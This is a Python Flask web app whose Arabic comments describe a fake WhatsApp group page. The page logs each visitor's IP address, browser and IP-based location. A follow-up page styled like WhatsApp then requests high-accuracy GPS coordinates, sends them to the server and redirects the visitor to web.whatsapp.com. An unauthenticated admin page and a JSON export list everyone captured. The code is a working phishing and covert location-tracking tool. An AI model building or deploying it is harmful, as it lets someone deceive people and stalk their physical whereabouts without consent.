from flask import Flask, request, jsonify, render_template, send_file
import requests
import json
import time
import os
import datetime
from threading import Thread
import sqlite3

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'

# قاعدة بيانات بسيطة
def init_db():
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp TEXT,
                  country TEXT,
                  city TEXT,
                  lat REAL,
                  lon REAL,
                  accuracy REAL)''')
    conn.commit()
    conn.close()

init_db()

def get_location_info(ip):
    """الحصول على معلومات الموقع من IP"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

def log_to_db(data):
    """حفظ البيانات في قاعدة البيانات"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                    (ip, user_agent, timestamp, country, city, lat, lon, accuracy)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                 (data.get('ip'), data.get('user_agent'), data.get('timestamp'),
                  data.get('country'), data.get('city'), data.get('lat'),
                  data.get('lon'), data.get('accuracy')))
        conn.commit()
        conn.close()
        print(f"✅ تم حفظ بيانات: {data.get('ip')} - {data.get('city', 'Unknown')}")
    except Exception as e:
        print(f"❌ خطأ في حفظ البيانات: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/whatsapp-group')
def fake_whatsapp_group():
    """صفحة مجموعة واتساب المزيفة"""
    # جمع المعلومات الأساسية فوراً
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    basic_info = {
        'ip': visitor_ip,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.datetime.now().isoformat()
    }
    
    # الحصول على الموقع التقريبي
    location_info = get_location_info(visitor_ip)
    if location_info and location_info.get('status') == 'success':
        basic_info.update({
            'country': location_info.get('country'),
            'city': location_info.get('city'),
            'lat': location_info.get('lat'),
            'lon': location_info.get('lon')
        })
    
    log_to_db(basic_info)
    
    return render_template('whatsapp_group.html')

@app.route('/join-group')
def join_group():
    """رابط الانضمام للمجموعة"""
    return render_template('location_access.html')

@app.route('/request-location')
def request_location():
    """طلب إذن الموقع"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>جاري التحميل</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #075E54;
                color: white;
                text-align: center;
                padding: 50px;
                direction: rtl;
            }
            .loader {
                border: 5px solid #f3f3f3;
                border-top: 5px solid #25D366;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <h2>جاري التحضير للمجموعة...</h2>
        <div class="loader"></div>
        <p>يرجى الانتظار</p>
        
        <script>
            // طلب الموقع بعد ثانيتين
            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            // إرسال الإحداثيات الدقيقة
                            fetch('/capture-location', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    lat: position.coords.latitude,
                                    lon: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    ip: '{{ request.remote_addr }}'
                                })
                            }).then(() => {
                                // التوجيه إلى واتساب
                                window.location.href = 'https://web.whatsapp.com';
                            });
                        },
                        function(error) {
                            // إذا رفض المستخدم
                            console.log('تم رفض طلب الموقع');
                            window.location.href = 'https://web.whatsapp.com';
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                } else {
                    window.location.href = 'https://web.whatsapp.com';
                }
            }, 2000);
        </script>
    </body>
    </html>
    '''

@app.route('/capture-location', methods=['POST'])
def capture_location():
    """استقبال الإحداثيات الدقيقة"""
    try:
        gps_data = request.json
        print(f"📍 تم الحصول على الإحداثيات: {gps_data}")
        
        # تحديث البيانات في قاعدة البيانات
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('''UPDATE logs SET lat = ?, lon = ?, accuracy = ?
                     WHERE ip = ? ORDER BY id DESC LIMIT 1''',
                 (gps_data.get('lat'), gps_data.get('lon'), 
                  gps_data.get('accuracy'), request.remote_addr))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success', 'message': 'تم حفظ الموقع'})
    except Exception as e:
        print(f"❌ خطأ في حفظ الموقع: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/admin')
def admin_dashboard():
    """لوحة التحكم"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC LIMIT 100')
    logs = c.fetchall()
    conn.close()
    
    return render_template('admin.html', logs=logs)

@app.route('/export-logs')
def export_logs():
    """تصدير البيانات"""
    conn = sqlite3.connect('tracker.db')
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY id DESC')
    logs = c.fetchall()
    conn.close()
    
    return jsonify([{
        'id': log[0],
        'ip': log[1],
        'user_agent': log[2],
        'timestamp': log[3],
        'country': log[4],
        'city': log[5],
        'lat': log[6],
        'lon': log[7],
        'accuracy': log[8]
    } for log in logs])

@app.route('/delete-logs', methods=['POST'])
def delete_logs():
    """حذف جميع السجلات"""
    try:
        conn = sqlite3.connect('tracker.db')
        c = conn.cursor()
        c.execute('DELETE FROM logs')
        conn.commit()
        conn.close()
        return jsonify({'status': 'success', 'message': 'تم حذف جميع السجلات'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
